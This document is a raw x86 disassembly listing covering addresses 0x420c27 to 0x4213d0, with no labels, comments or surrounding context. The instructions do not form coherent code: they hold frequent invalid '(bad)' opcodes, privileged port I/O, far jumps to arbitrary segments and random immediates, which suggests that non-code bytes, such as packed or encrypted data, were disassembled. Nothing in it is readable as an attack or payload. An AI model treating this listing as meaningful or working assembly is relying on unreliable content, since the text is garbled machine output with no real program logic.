  420c27:	in     al,0xa6
  420c29:	mov    esi,0x3d2d2c71
  420c2e:	fnsave [eax+eax*4+0x20]
  420c32:	shl    DWORD PTR [ecx+0x1380bffc],cl
  420c38:	pop    edi
  420c39:	(bad)  
  420c3a:	shl    BYTE PTR [edi-0x183d3353],0x5d
  420c41:	jecxz  0x420c63
  420c43:	mov    esp,0xb1eb7a3b
  420c48:	inc    edi
  420c49:	call   0xe7cd:0xd6251c5c
  420c50:	pop    edi
  420c51:	aam    0x8b
  420c53:	fsub   DWORD PTR [esi+0x48]
  420c56:	test   BYTE PTR ds:0xa1ef1f4b,0x70
  420c5d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c5f:	shl    ah,cl
  420c61:	lods   eax,DWORD PTR ds:[esi]
  420c62:	sti    
  420c63:	scas   al,BYTE PTR es:[edi]
  420c64:	(bad)  
  420c65:	xchg   esp,esp
  420c67:	or     DWORD PTR [ebx],esi
  420c69:	cmc    
  420c6a:	iret   
  420c6b:	cwde   
  420c6c:	outs   dx,DWORD PTR ds:[esi]
  420c6d:	inc    edi
  420c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c6f:	js     0x420ca4
  420c71:	imul   ecx,DWORD PTR [edi+esi*8+0x37a4d28d],0xfffffff5
  420c79:	cdq    
  420c7a:	push   edx
  420c7b:	jo     0x420cc7
  420c7d:	mov    BYTE PTR [edx*8+0x6e55ae69],ch
  420c84:	mov    ch,0x1d
  420c86:	mov    edi,0x19bb1ba5
  420c8b:	cmp    eax,0xb20e6d17
  420c90:	push   ecx
  420c91:	dec    edx
  420c92:	mov    ch,0x6e
  420c94:	rcl    BYTE PTR [esi],0xeb
  420c97:	or     DWORD PTR [eax-0x30],0x7d610a17
  420c9e:	cmp    ah,BYTE PTR [ecx+0x327eac55]
  420ca4:	adc    eax,DWORD PTR ds:0x2498ecc2
  420caa:	not    BYTE PTR [ecx+esi*1-0x6c431ca]
  420cb1:	in     eax,dx
  420cb2:	mov    esp,0x577f7d28
  420cb7:	repnz pusha 
  420cb9:	cmc    
  420cba:	cmp    edi,DWORD PTR ds:0xf17502bd
  420cc0:	add    al,0x23
  420cc2:	inc    edi
  420cc3:	xor    al,0xfc
  420cc5:	icebp  
  420cc6:	out    0x84,eax
  420cc8:	xchg   DWORD PTR [edx+edx*1-0x10],edi
  420ccc:	xchg   esi,eax
  420ccd:	adc    eax,0xea96e2f4
  420cd2:	xchg   ebx,eax
  420cd3:	fbld   TBYTE PTR [eax+edx*1-0x57]
  420cd7:	jbe    0x420ca6
  420cd9:	or     BYTE PTR [edi-0x4b],al
  420cdc:	jne    0x420cc1
  420cde:	push   esp
  420cdf:	imul   edx,DWORD PTR ds:0x8c4c6c12,0x57578a3d
  420ce9:	test   BYTE PTR [ecx],bl
  420ceb:	fstp   TBYTE PTR [eax-0x5ae5512c]
  420cf1:	adc    al,0xe2
  420cf3:	je     0x420cdf
  420cf5:	hlt    
  420cf6:	dec    ebp
  420cf7:	jle    0x420ccd
  420cf9:	sbb    al,BYTE PTR [eax+0x63]
  420cfc:	add    al,BYTE PTR [ebp+0x78ff8571]
  420d02:	call   0xae23:0xc1d871a4
  420d09:	imul   eax,DWORD PTR [ecx+0x5b38c65a],0x33
  420d10:	dec    eax
  420d11:	jg     0x420d5b
  420d13:	enter  0x246a,0xcf
  420d17:	test   eax,0x7b67ccfa
  420d1c:	out    0xa5,eax
  420d1e:	mov    esi,0x9d30bd29
  420d23:	loopne 0x420cc4
  420d25:	int3   
  420d26:	cld    
  420d27:	dec    edx
  420d28:	cdq    
  420d29:	or     DWORD PTR [ecx+ecx*2],0x7c6dc2be
  420d30:	(bad)
  420d34:	stos   BYTE PTR es:[edi],al
  420d35:	(bad)  
  420d36:	lea    eax,[edx]
  420d38:	(bad)  
  420d3a:	push   cs
  420d3b:	pop    es
  420d3c:	les    ebp,FWORD PTR [ecx-0x3e]
  420d3f:	ror    DWORD PTR [edi+0x5b473f5],1
  420d45:	das    
  420d46:	cmp    bh,BYTE PTR gs:[ecx]
  420d49:	(bad)  [ebp+0x1]
  420d4c:	jb     0x420d20
  420d4e:	mov    ebx,0x3d8f03d2
  420d53:	and    eax,0xf03b16f6
  420d58:	sar    DWORD PTR [edx-0x2cdeeca6],0x7b
  420d5f:	pop    ds
  420d60:	pop    esi
  420d61:	mov    eax,ds:0xad97d0fa
  420d66:	cdq    
  420d67:	and    eax,0x556080e3
  420d6c:	push   ebp
  420d6d:	sbb    al,0x19
  420d6f:	sti    
  420d70:	xor    eax,0x5ab1d7c2
  420d75:	mov    esp,0x9af4cd54
  420d7a:	mov    esi,0x4492232b
  420d7f:	lock jl 0x420d9b
  420d82:	jo     0x420d4f
  420d84:	cdq    
  420d85:	mov    esi,0x40311659
  420d8a:	cs push ss
  420d8c:	mov    dl,0x7d
  420d8e:	ror    ebp,0x4c
  420d91:	push   esp
  420d92:	daa    
  420d93:	mov    bh,0xd5
  420d95:	retf   0x3cd5
  420d98:	lds    edx,FWORD PTR [edx]
  420d9a:	rcl    BYTE PTR [edi],0x57
  420d9d:	push   esi
  420d9e:	mov    dh,BYTE PTR [esi]
  420da0:	inc    eax
  420da1:	pop    ss
  420da2:	inc    edi
  420da3:	aas    
  420da4:	dec    eax
  420da5:	mov    ds:0x643c123,eax
  420daa:	xor    ebx,DWORD PTR [edx+0x702310ac]
  420db0:	and    ah,bl
  420db2:	mov    ecx,0x5afd37a2
  420db7:	jno    0x420e0e
  420db9:	pushf  
  420dba:	pop    ecx
  420dbb:	stos   DWORD PTR es:[edi],eax
  420dbc:	jecxz  0x420dc8
  420dbe:	pop    ecx
  420dbf:	push   edx
  420dc0:	add    DWORD PTR [ebx],edi
  420dc2:	push   ss
  420dc3:	loope  0x420d9f
  420dc5:	xlat   BYTE PTR ds:[ebx]
  420dc6:	mov    cs,ebp
  420dc8:	(bad)  
  420dc9:	and    eax,DWORD PTR [ebx]
  420dcb:	loop   0x420e2a
  420dcd:	mov    BYTE PTR [ebx-0x1a],0x16
  420dd1:	fisttp WORD PTR [eax]
  420dd3:	sub    al,0xad
  420dd5:	xchg   ecx,eax
  420dd6:	jns    0x420d7f
  420dd8:	imul   ecx,eax,0x370677a2
  420dde:	xor    DWORD PTR [edx-0x1058f07],ecx
  420de4:	and    BYTE PTR [ecx*2-0x1c4e0ceb],ch
  420deb:	ror    DWORD PTR [ecx+0x36],0x50
  420def:	(bad)  
  420df1:	push   0xef2453d9
  420df6:	lock daa 
  420df8:	scas   eax,DWORD PTR es:[edi]
  420df9:	adc    eax,0x1f461b61
  420dfe:	out    0x92,al
  420e00:	arpl   WORD PTR [eax],bx
  420e02:	fisubr DWORD PTR [ebx-0x70]
  420e05:	retf   0x158c
  420e08:	mov    al,0x3d
  420e0a:	dec    ebp
  420e0b:	fadd   DWORD PTR [ebx+0x6c]
  420e0e:	and    DWORD PTR [ebp+0x1a02ba20],ecx
  420e14:	pop    ebx
  420e15:	push   ecx
  420e16:	shl    dl,0x50
  420e19:	jb     0x420e8e
  420e1b:	shl    BYTE PTR [ecx],0x9c
  420e1e:	fs mov bh,0xbb
  420e21:	lods   eax,DWORD PTR ds:[esi]
  420e22:	inc    esi
  420e23:	xor    BYTE PTR [edx-0x2a],0xa
  420e27:	fisub  DWORD PTR [ecx]
  420e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e2a:	outs   dx,BYTE PTR ds:[esi]
  420e2b:	mov    eax,0xdaa52c4b
  420e30:	ins    DWORD PTR es:[edi],dx
  420e31:	xchg   esp,eax
  420e32:	sub    eax,0x61525660
  420e37:	lea    edi,[edx+ecx*4]
  420e3a:	mov    esp,0x4d38d01b
  420e3f:	sbb    bh,ah
  420e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e42:	pushf  
  420e43:	lods   al,BYTE PTR ds:[esi]
  420e44:	fst    QWORD PTR [edx+0x1d]
  420e47:	test   al,0x1e
  420e49:	jg     0x420e23
  420e4b:	push   ebx
  420e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e4d:	jbe    0x420ddf
  420e4f:	dec    ebp
  420e50:	nop
  420e51:	dec    ecx
  420e52:	dec    edx
  420e53:	lock gs gs fcomp st(6)
  420e58:	clc    
  420e59:	test   al,0xdf
  420e5b:	ins    DWORD PTR es:[edi],dx
  420e5c:	shr    BYTE PTR [esp+ebx*1+0x56],1
  420e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e61:	cmp    BYTE PTR [ebp-0x5a],ch
  420e64:	jg     0x420e4e
  420e66:	ret    
  420e67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e68:	push   edx
  420e69:	(bad)  
  420e6a:	inc    ebp
  420e6b:	es retf 
  420e6d:	ja     0x420e7f
  420e6f:	sub    al,0x87
  420e71:	js     0x420e99
  420e73:	mov    DWORD PTR es:[eax+0x1dca2e54],edi
  420e7a:	cmp    BYTE PTR [edx],cl
  420e7c:	loopne 0x420ed8
  420e7e:	je     0x420e64
  420e80:	and    al,0xa0
  420e82:	mov    edx,DWORD PTR [edi+0x4579761a]
  420e88:	inc    eax
  420e89:	leave  
  420e8a:	sub    eax,0x61b67155
  420e8f:	cmp    al,0x3e
  420e91:	push   edx
  420e92:	mov    ds:0x390e04de,al
  420e97:	and    al,BYTE PTR [ebx+0x7b4c25df]
  420e9d:	clc    
  420e9e:	mov    eax,0xe7638514
  420ea3:	or     eax,0xea6d962b
  420ea8:	push   ebp
  420ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eaa:	cmp    eax,0xe78f3912
  420eaf:	jp     0x420ea7
  420eb1:	fxch   st(3)
  420eb3:	fwait
  420eb4:	out    0x1d,al
  420eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eb7:	lods   al,BYTE PTR ds:[esi]
  420eb8:	add    dh,al
  420eba:	push   ebp
  420ebb:	mov    al,0x6f
  420ebd:	push   cs
  420ebe:	dec    ecx
  420ebf:	call   0x4ee3:0x64842ed2
  420ec6:	jle    0x420ec4
  420ec8:	loop   0x420e98
  420eca:	mov    cl,0x45
  420ecc:	pop    ebx
  420ecd:	push   esi
  420ece:	daa    
  420ecf:	or     ah,dh
  420ed1:	inc    edx
  420ed2:	adc    eax,0xc4541180
  420ed7:	fldenv [edi-0x49]
  420eda:	ret    0x8635
  420edd:	loopne 0x420eac
  420edf:	aad    0x74
  420ee1:	mov    edi,0x9bbf8eaa
  420ee6:	js     0x420ecb
  420ee8:	adc    esp,DWORD PTR [ebx-0x4425ecbd]
  420eee:	leave  
  420eef:	mov    esi,DWORD PTR [ebx-0x3e]
  420ef2:	ror    eax,cl
  420ef4:	sar    DWORD PTR [esi-0x7a],0xc5
  420ef8:	lods   al,BYTE PTR ds:[esi]
  420ef9:	pusha  
  420efa:	stos   BYTE PTR es:[edi],al
  420efb:	mov    al,0xa9
  420efd:	aaa    
  420efe:	xlat   BYTE PTR ds:[ebx]
  420eff:	mov    bl,0xe8
  420f01:	jecxz  0x420f2e
  420f03:	sbb    DWORD PTR [ecx],0x700bea21
  420f09:	adc    edi,DWORD PTR [esi+ecx*4]
  420f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f0d:	jnp    0x420ef5
  420f0f:	cli    
  420f10:	jle    0x420e9a
  420f12:	imul   edx,DWORD PTR [ecx-0xf3869d2],0x67
  420f19:	aam    0x87
  420f1b:	retf   
  420f1c:	push   0x77
  420f1e:	add    al,0xba
  420f20:	rol    DWORD PTR [esi],cl
  420f22:	jp     0x420f6f
  420f24:	ss mov esi,0x93fa911d
  420f2a:	aaa    
  420f2b:	xor    al,0x1b
  420f2d:	les    edi,FWORD PTR [edx*1+0x16467f9]
  420f34:	or     BYTE PTR [ebp-0x5d],cl
  420f37:	jge    0x420ee1
  420f39:	rcr    ch,cl
  420f3b:	jl     0x420ed0
  420f3d:	mov    ds:0xcf0b9f17,al
  420f42:	sahf   
  420f43:	rcl    BYTE PTR [ecx],cl
  420f45:	sbb    al,0x5b
  420f47:	and    DWORD PTR [edi+0x2ba5149f],edx
  420f4d:	in     eax,0xe4
  420f4f:	and    dh,BYTE PTR [ebx+0x6990e8cf]
  420f55:	test   DWORD PTR ds:0xa4506c6d,esi
  420f5b:	shr    BYTE PTR [edx+0x2147a599],0x77
  420f62:	xor    BYTE PTR [esi-0x5b],bl
  420f65:	inc    edx
  420f66:	retf   
  420f67:	xor    DWORD PTR [eax+0x289d1a4e],esi
  420f6d:	push   ebp
  420f6e:	xchg   esp,eax
  420f6f:	fs aad 0x6b
  420f72:	mov    ch,0xd6
  420f74:	or     esp,ebx
  420f76:	sub    al,0x32
  420f78:	dec    esi
  420f79:	pop    ss
  420f7a:	and    cl,BYTE PTR [edx]
  420f7c:	cs cwde 
  420f7e:	fisubr DWORD PTR [ebx+0x51]
  420f81:	nop
  420f82:	into   
  420f83:	xchg   edx,eax
  420f84:	scas   al,BYTE PTR es:[edi]
  420f85:	std    
  420f86:	jl     0x420f37
  420f88:	adc    dh,0x92
  420f8b:	std    
  420f8c:	cmp    bl,BYTE PTR [esi]
  420f8e:	mov    bh,0x2
  420f90:	mov    al,0xa8
  420f92:	xor    al,0x52
  420f94:	ret    0x6e
  420f97:	leave  
  420f98:	in     eax,0x8b
  420f9a:	adc    DWORD PTR [ebx],0x3b87c0a9
  420fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fa1:	mov    dh,0x48
  420fa3:	rol    DWORD PTR [esi-0x40],0x7b
  420fa7:	outs   dx,BYTE PTR ds:[esi]
  420fa8:	cmp    eax,0xceb50ecc
  420fad:	xchg   edi,eax
  420fae:	mov    DWORD PTR [ebx],ebx
  420fb0:	push   esi
  420fb1:	sbb    al,0xae
  420fb3:	push   eax
  420fb4:	popa   
  420fb5:	jmp    0xd201:0x6898d914
  420fbc:	jne    0x420f9f
  420fbe:	mul    BYTE PTR [ecx+ebx*4]
  420fc1:	mov    ah,0xdf
  420fc3:	push   ds
  420fc4:	repnz mov al,ds:0xaf8b076c
  420fca:	push   ds
  420fcb:	mov    BYTE PTR [ebx+0x55],ah
  420fce:	arpl   WORD PTR [edi-0x37],ax
  420fd1:	xchg   esi,eax
  420fd2:	aad    0x6e
  420fd4:	outs   dx,DWORD PTR ds:[esi]
  420fd5:	inc    BYTE PTR [ebx]
  420fd7:	das    
  420fd8:	jbe    0x420fae
  420fda:	jne    0x420f79
  420fdc:	add    cl,dh
  420fde:	lahf   
  420fdf:	mov    DWORD PTR [edi-0x50],ebx
  420fe2:	or     BYTE PTR [edi+edi*1+0x1f],dh
  420fe6:	inc    ebp
  420fe7:	arpl   sp,si
  420fe9:	jle    0x420fb9
  420feb:	jle    0x42103a
  420fed:	sbb    al,0x45
  420fef:	mov    fs,WORD PTR [esi+edx*4+0xe]
  420ff3:	in     eax,0xe9
  420ff5:	out    dx,al
  420ff6:	push   esp
  420ff7:	xchg   bh,ah
  420ff9:	out    dx,eax
  420ffa:	cs jbe 0x421023
  420ffd:	xor    DWORD PTR [ebx],0xab63d269
  421003:	pop    ebp
  421004:	shl    bl,1
  421006:	(bad)  
  421007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421008:	mov    ds:0xd0c26ee1,al
  42100d:	xchg   edi,eax
  42100e:	pop    ss
  42100f:	in     eax,0x4c
  421011:	dec    edx
  421012:	int    0x73
  421014:	stc    
  421015:	lods   al,BYTE PTR ds:[esi]
  421016:	inc    esp
  421017:	cld    
  421018:	stc    
  421019:	mov    bh,0x3d
  42101b:	cli    
  42101c:	rcr    DWORD PTR [ebx-0x74],cl
  42101f:	xchg   esi,eax
  421020:	or     esp,esp
  421022:	into   
  421023:	aad    0xdd
  421025:	mov    ecx,edx
  421027:	adc    ebx,0xffffffa2
  42102a:	mov    esi,0xc64f6c78
  42102f:	xlat   BYTE PTR ds:[bx]
  421031:	jmp    0x94d3:0x79ab1690
  421038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421039:	lods   eax,DWORD PTR ds:[esi]
  42103a:	jmp    0xf4ca:0x626c9ff7
  421041:	les    ecx,FWORD PTR [ebx]
  421043:	pusha  
  421044:	mov    al,0xaf
  421046:	jle    0x421079
  421048:	pop    eax
  421049:	test   WORD PTR [ebx-0x53],dx
  42104d:	jle    0x421024
  42104f:	xor    DWORD PTR [esi+eiz*8],esi
  421052:	fwait
  421053:	jmp    0x6534d4ab
  421058:	jmp    0x4c72175f
  42105d:	mov    eax,ds:0xfdff8881
  421062:	xor    edx,DWORD PTR [eax-0xeb0931]
  421068:	loopne 0x42103f
  42106a:	outs   dx,BYTE PTR ds:[esi]
  42106b:	dec    edi
  42106c:	ret    0x8cd8
  42106f:	add    al,0xdd
  421071:	xchg   ebp,eax
  421072:	adc    BYTE PTR [edx-0x4a0adcf4],dl
  421078:	bound  eax,QWORD PTR [ebp-0x12b8c112]
  42107e:	and    dh,cl
  421080:	cli    
  421081:	jecxz  0x42104a
  421083:	int    0xc9
  421085:	dec    eax
  421086:	(bad)  
  421087:	into   
  421088:	and    al,bh
  42108a:	or     ah,bh
  42108c:	es xor eax,0xf29ab0ed
  421092:	cld    
  421093:	(bad)  
  421094:	es pop es
  421096:	ins    BYTE PTR es:[edi],dx
  421097:	les    ebx,FWORD PTR [esi]
  421099:	adc    ebp,DWORD PTR [ebp-0x8ea7d35]
  42109f:	xchg   edi,eax
  4210a0:	push   ss
  4210a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210a2:	fs dec ebp
  4210a4:	aas    
  4210a5:	stos   DWORD PTR es:[edi],eax
  4210a6:	in     al,0x33
  4210a8:	fimul  WORD PTR [esi]
  4210aa:	(bad)
  4210af:	pop    es
  4210b0:	retf   
  4210b1:	adc    dl,BYTE PTR ds:0x1d1c0b11
  4210b7:	add    esi,DWORD PTR [ebp-0x1a]
  4210ba:	mov    dh,0x9
  4210bc:	daa    
  4210bd:	inc    ecx
  4210be:	dec    esp
  4210bf:	in     al,dx
  4210c0:	sub    bl,BYTE PTR [esi+0x7e]
  4210c3:	outs   dx,BYTE PTR ds:[esi]
  4210c4:	push   esi
  4210c5:	rol    BYTE PTR [edx-0x33],cl
  4210c8:	dec    ebp
  4210c9:	push   edx
  4210ca:	dec    eax
  4210cb:	mov    bh,0x3d
  4210cd:	call   0xbfde:0x8ddc6be0
  4210d4:	cmp    BYTE PTR [ecx+ebp*8-0x73dae265],cl
  4210db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210dc:	fwait
  4210dd:	xor    DWORD PTR [eax+0x7b],ecx
  4210e0:	pop    ebp
  4210e1:	or     ecx,edx
  4210e3:	and    DWORD PTR [esp+edx*8-0x62],esp
  4210e7:	jb     0x4210f0
  4210e9:	pop    edx
  4210ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210eb:	jmp    0x42110a
  4210ed:	outs   dx,DWORD PTR ds:[esi]
  4210ee:	aad    0xc4
  4210f0:	mov    al,ds:0xd1c327b0
  4210f5:	popf   
  4210f6:	push   esi
  4210f7:	jae    0x42112b
  4210f9:	sub    BYTE PTR [edi-0x7d],dh
  4210fc:	xchg   ebx,eax
  4210fd:	mov    BYTE PTR [ebx+edi*2+0x61920a63],bh
  421104:	pop    ecx
  421105:	out    dx,al
  421106:	popa   
  421107:	mov    dl,0xed
  421109:	cld    
  42110a:	push   esi
  42110b:	mov    ebx,0x37e79e0e
  421110:	jns    0x421156
  421112:	jno    0x4210d4
  421114:	int3   
  421115:	inc    edx
  421116:	and    ebx,edx
  421118:	adc    ch,BYTE PTR [ebx]
  42111a:	adc    DWORD PTR [eax],esp
  42111c:	lahf   
  42111d:	mov    edx,DWORD PTR ds:0x47ef9aca
  421123:	cmp    edi,esi
  421125:	es hlt 
  421127:	push   0xffffffb9
  421129:	inc    edi
  42112a:	mov    esi,0x2c4ed54
  42112f:	(bad)  [edi+0x47]
  421132:	fsub   DWORD PTR [ecx+0x15]
  421135:	cmp    DWORD PTR [edx],0xced7863c
  42113b:	push   esi
  42113c:	jecxz  0x42114c
  42113e:	cmp    DWORD PTR [esi+0x562a949],ecx
  421144:	add    dl,BYTE PTR ds:0xd4c8fdb6
  42114a:	stos   BYTE PTR es:[edi],al
  42114b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42114c:	ja     0x4211c6
  42114e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42114f:	(bad)  
  421150:	and    eax,0xe15b7e1d
  421155:	mov    ebp,0xdf6c2aa0
  42115a:	out    0x7a,eax
  42115c:	cmp    ebx,DWORD PTR [eax-0x3e]
  42115f:	repnz inc ecx
  421161:	aas    
  421162:	inc    eax
  421163:	icebp  
  421164:	retf   
  421165:	mov    dl,BYTE PTR [ebx]
  421167:	xchg   edi,eax
  421168:	fwait
  421169:	mov    ebx,0xea454b5d
  42116e:	sub    al,BYTE PTR [eax-0x4c]
  421171:	xchg   esi,eax
  421172:	sub    al,0x9f
  421174:	hlt    
  421175:	xchg   ecx,eax
  421176:	stos   BYTE PTR es:[edi],al
  421177:	push   ebp
  421178:	pop    ds
  421179:	jmp    DWORD PTR [ebx-0x61]
  42117c:	ds mov edi,0xc1fb292c
  421182:	add    al,0xd9
  421184:	pop    esi
  421185:	and    esp,DWORD PTR [eax-0x4a040106]
  42118b:	xchg   esi,eax
  42118c:	in     al,dx
  42118d:	psraw  mm1,QWORD PTR [edi-0x422cb016]
  421194:	dec    esi
  421195:	mov    cl,0x73
  421197:	pushf  
  421198:	xchg   eax,esp
  42119a:	iret   
  42119b:	jp     0x421173
  42119d:	fld    DWORD PTR [edx+0x3b]
  4211a0:	push   ebx
  4211a1:	jecxz  0x421138
  4211a3:	push   ecx
  4211a4:	add    DWORD PTR [eax+0x41],edi
  4211a7:	jmp    0x42113b
  4211a9:	call   FWORD PTR [ebx-0x17624f36]
  4211af:	aad    0xa0
  4211b1:	or     eax,0x7b0f988b
  4211b6:	mov    ch,0x9c
  4211b8:	mov    cl,0xf0
  4211ba:	fld    QWORD PTR [esi-0x1be54144]
  4211c0:	mov    bl,0x54
  4211c2:	out    0x59,eax
  4211c4:	test   DWORD PTR [esi],esi
  4211c6:	jp     0x4211cc
  4211c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211c9:	adc    eax,0x707e0c24
  4211ce:	pop    ebx
  4211cf:	and    eax,0xf0c46063
  4211d4:	pop    ds
  4211d5:	addr16 xor eax,0x28618deb
  4211db:	popa   
  4211dc:	jmp    0xf5c2a133
  4211e1:	jmp    0xfe73:0xdeb1aba1
  4211e8:	add    BYTE PTR [edx-0x1b],0xa0
  4211ec:	out    dx,al
  4211ed:	xchg   edi,eax
  4211ee:	or     BYTE PTR [esi+0x4707980e],ch
  4211f4:	mov    dl,0x74
  4211f6:	imul   eax,ecx,0x3a2eab56
  4211fc:	rcl    bl,1
  4211fe:	lods   al,BYTE PTR ds:[esi]
  4211ff:	dec    ebp
  421200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421201:	mov    edi,0xa3f59d4a
  421206:	dec    edi
  421207:	pushf  
  421208:	mov    ebp,0x18e753cc
  42120d:	jb     0x421279
  42120f:	cmp    edi,DWORD PTR [edx+0x7f2d829a]
  421215:	sbb    ch,BYTE PTR [eax-0x22]
  421218:	int3   
  421219:	dec    ecx
  42121a:	iret   
  42121b:	xchg   ebx,eax
  42121c:	add    eax,0x56d78b22
  421221:	mov    ds:0x45aa4013,al
  421226:	and    al,0x19
  421228:	test   DWORD PTR [ebp+0x2cbba90d],eax
  42122e:	jle    0x4211ef
  421230:	xlat   BYTE PTR ds:[ebx]
  421231:	jmp    0x29ce60f3
  421236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421237:	out    dx,al
  421238:	repnz mov ds:0xaa15c3ba,al
  42123e:	(bad)  
  42123f:	rcr    BYTE PTR [esp+ebx*4],0xd7
  421243:	rcl    cl,cl
  421245:	mov    cl,0x3c
  421247:	fdivr  DWORD PTR [edi+0x6d]
  42124a:	jecxz  0x421226
  42124c:	jecxz  0x4212bc
  42124e:	icebp  
  42124f:	enter  0x339f,0x24
  421253:	call   0x858f:0x1c528050
  42125a:	jl     0x4212a7
  42125c:	inc    ebp
  42125d:	out    dx,al
  42125e:	jo     0x42127e
  421260:	gs mov dh,0x14
  421263:	sbb    esi,ebp
  421265:	aad    0xc5
  421267:	mov    esp,ecx
  421269:	(bad)
  42126d:	mov    BYTE PTR [edi],bh
  42126f:	arpl   WORD PTR [edi+edx*4],di
  421272:	sar    bl,cl
  421274:	je     0x421297
  421276:	dec    ebx
  421277:	adc    BYTE PTR [eax+esi*4+0x3c],0xb9
  42127c:	push   ds
  42127d:	cmp    BYTE PTR [eax],dl
  42127f:	xor    ah,BYTE PTR [edx]
  421281:	fdivr  DWORD PTR [edi-0x5015bb05]
  421287:	mov    BYTE PTR [eax+edx*8],dl
  42128a:	js     0x4212fa
  42128c:	and    ch,BYTE PTR [bx+di-0x3e]
  421290:	jmp    0x382b:0xd8dca403
  421297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421298:	sar    BYTE PTR [ebx-0xcd2450c],1
  42129e:	jns    0x42122a
  4212a0:	call   0xc9a55c83
  4212a5:	inc    esi
  4212a6:	fild   WORD PTR [ecx-0x7a]
  4212a9:	sbb    BYTE PTR [edi-0x7baf70fc],0x1c
  4212b0:	jb     0x42131d
  4212b2:	ins    BYTE PTR es:[edi],dx
  4212b3:	push   ds
  4212b4:	sub    esp,ebx
  4212b6:	fisttp QWORD PTR [edi+0x6a0fc1fb]
  4212bc:	aad    0xc8
  4212be:	or     ecx,ebx
  4212c0:	sub    DWORD PTR [edi-0x2],esp
  4212c3:	mov    es,WORD PTR [eax+0x3e]
  4212c6:	or     eax,0xad438401
  4212cb:	jns    0x4212b7
  4212cd:	mov    esi,0x52cbf0cc
  4212d2:	jnp    0x421293
  4212d4:	(bad)  
  4212d6:	sbb    ebx,DWORD PTR [edi+eiz*2+0x2]
  4212da:	(bad)  
  4212db:	sub    edx,DWORD PTR [ebx]
  4212dd:	mov    edi,0xd9bdf5e1
  4212e2:	sbb    DWORD PTR [eax+eax*2],edi
  4212e5:	imul   dl
  4212e7:	add    ecx,esp
  4212e9:	cmc    
  4212ea:	mov    ds:0x699a335c,al
  4212ef:	leave  
  4212f0:	pop    edx
  4212f1:	mov    ah,0x33
  4212f3:	mov    WORD PTR [edx-0x42],gs
  4212f6:	shl    DWORD PTR [ecx+0x7d626b52],cl
  4212fc:	(bad)  
  4212fd:	mov    edi,0xafa0f9c3
  421302:	ss retf 
  421304:	call   0xd9cf88f2
  421309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42130a:	outs   dx,DWORD PTR ds:[esi]
  42130b:	or     ebp,eax
  42130d:	jb     0x4212a7
  42130f:	loopne 0x421355
  421311:	out    0x3c,eax
  421313:	inc    eax
  421315:	cli    
  421316:	neg    BYTE PTR [eax]
  421318:	cli    
  421319:	rol    bl,0xbb
  42131c:	(bad)  
  42131d:	fsubr  DWORD PTR [edx-0x60718ce]
  421323:	call   0xe1e4:0x709bc07a
  42132a:	fwait
  42132b:	sub    BYTE PTR gs:[ebx-0x76],dh
  42132f:	and    ah,BYTE PTR [edx]
  421331:	retf   0x4d4f
  421334:	sbb    ah,dh
  421336:	fsubr  DWORD PTR [edi]
  421338:	push   0x6f
  42133a:	lahf   
  42133b:	push   esi
  42133c:	fwait
  42133d:	lock push ebx
  42133f:	leave  
  421340:	push   edi
  421341:	adc    BYTE PTR [ebx+0x1a5c745c],ch
  421347:	sahf   
  421348:	cld    
  421349:	push   ebp
  42134a:	arpl   WORD PTR [ebx],di
  42134c:	push   ecx
  42134d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42134e:	lock fcom QWORD PTR [ecx+ebp*4]
  421352:	cwde   
  421353:	cmp    ebp,eax
  421355:	(bad)  
  421356:	push   es
  421357:	push   es
  421358:	out    0x1f,al
  42135a:	push   ebx
  42135b:	jmp    0x204e6296
  421360:	pop    ecx
  421361:	mov    bl,0x2e
  421363:	push   DWORD PTR [ebx+0x3af7861a]
  421369:	icebp  
  42136a:	mov    DWORD PTR [ebx*8-0x5afdbb06],esp
  421371:	push   edx
  421372:	sbb    ah,dl
  421374:	(bad)  
  421376:	pop    edi
  421377:	repz fucomi st,st(3)
  42137a:	dec    esp
  42137b:	frstor [esi+0x70]
  42137e:	jae    0x421339
  421380:	cmc    
  421381:	add    eax,0x13c2f7d2
  421386:	mov    edi,DWORD PTR [edi-0x10f5d118]
  42138c:	out    0xf2,eax
  42138e:	(bad)  
  42138f:	hlt    
  421390:	xor    DWORD PTR [eax-0x6d565d1f],0x1a
  421397:	js     0x4213fd
  421399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42139a:	push   0xe3db1f2a
  42139f:	push   esp
  4213a0:	sub    ch,BYTE PTR [edx-0x6fbc7299]
  4213a6:	add    al,0x3c
  4213a8:	and    ebp,ebx
  4213aa:	push   0x1559b8dc
  4213af:	xor    esi,edi
  4213b1:	mov    ebx,0xe0001825
  4213b6:	loope  0x421408
  4213b8:	ret    
  4213b9:	mov    bh,0x41
  4213bb:	mov    BYTE PTR [edx+0x33],ch
  4213be:	add    DWORD PTR [esi+eiz*1],eax
  4213c1:	ror    BYTE PTR [esi-0x22514215],0xd7
  4213c8:	out    0x29,eax
  4213ca:	ret    0x8e73
  4213cd:	sbb    DWORD PTR [ecx+eax*4],eax
  4213d0:	adc    BYTE PTR [ecx+0xd614ce8],bl
